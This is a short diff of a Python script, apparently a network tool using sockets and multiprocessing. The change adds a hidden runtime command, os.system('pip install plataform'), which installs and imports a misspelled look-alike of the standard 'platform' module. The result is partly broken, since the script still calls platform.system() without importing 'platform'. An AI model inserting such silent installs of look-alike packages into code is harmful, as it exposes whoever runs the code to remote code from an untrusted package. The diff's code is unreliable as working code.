@@ -1,6 +1,11 @@
 import socket
+import os
 from time import sleep
-import multiprocessing, random
+import multiprocessing
+import random
+print("Attempting to install plataform module")
+os.system("pip install plataform")
+import plataform
 
 print("Detecting System...")
 sysOS = platform.system()
